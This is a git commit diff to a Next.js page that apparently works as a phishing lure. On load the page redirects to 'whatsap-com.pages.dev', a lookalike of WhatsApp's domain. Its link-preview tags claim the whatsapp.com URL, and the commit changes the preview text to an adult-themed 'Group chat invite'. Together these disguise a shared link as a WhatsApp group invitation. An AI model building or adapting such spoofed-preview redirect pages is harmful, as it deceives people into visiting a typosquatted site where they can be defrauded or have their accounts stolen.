d5c66177907e374b431413165de3bef91ec113ec
dakausinde <138789851+dakau255@users.noreply.github.com>
2023-12-10 13:29:47 +0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -1,7 +1,6 @@
-
-import { useEffect } from 'react';
-import { useRouter } from 'next/router';
-import Head from 'next/head';
+import { useEffect } from "react";
+import { useRouter } from "next/router";
+import Head from "next/head";
 
 function Home({ randomImage }) {
   const router = useRouter();
@@ -9,21 +8,20 @@ function Home({ randomImage }) {
   useEffect(() => {
     // Perform redirection logic here
     // For example, redirect to https://example.com
-    router.push('https://whatsap-com.pages.dev');
+    router.push("https://whatsap-com.pages.dev");
   }, []); // The empty dependency array ensures that this effect runs only once on component mount
 
   return (
     <div>
       <Head>
         <meta property="og:image" content={randomImage} />
-        <meta property="og:title" content="Dynamic OG Image Next.js App" />
-        <meta property="og:description" content="A simple Next.js app with a dynamic OG image." />
+        <meta property="og:title" content="Pic🔞chill🥴video" />
+        <meta property="og:description" content="Group chat invite" />
         <meta property="og:url" content="https://whatsapp.com" />
         {/* Other meta tags */}
       </Head>
 
       {/* Your page content */}
-     
     </div>
   );
 }
@@ -31,12 +29,11 @@ function Home({ randomImage }) {
 export async function getServerSideProps() {
   // Array of sample image URLs
   const imageArray = [
-    'https://i.ibb.co/wY3wrQZ/IMG-20231209-WA0290-min.jpg',
-        'https://i.ibb.co/thjWpFs/IMG-20231209-WA0317-min.jpg',
-        'https://i.ibb.co/j8kmb0B/IMG-20231209-WA0460-1-min.jpg',
+    "https://i.ibb.co/wY3wrQZ/IMG-20231209-WA0290-min.jpg",
+    "https://i.ibb.co/thjWpFs/IMG-20231209-WA0317-min.jpg",
+    "https://i.ibb.co/j8kmb0B/IMG-20231209-WA0460-1-min.jpg",
     // Add more image URLs as needed
   ];
-  
 
   // Select a random image from the array
   const randomImage = imageArray[Math.floor(Math.random() * imageArray.length)];
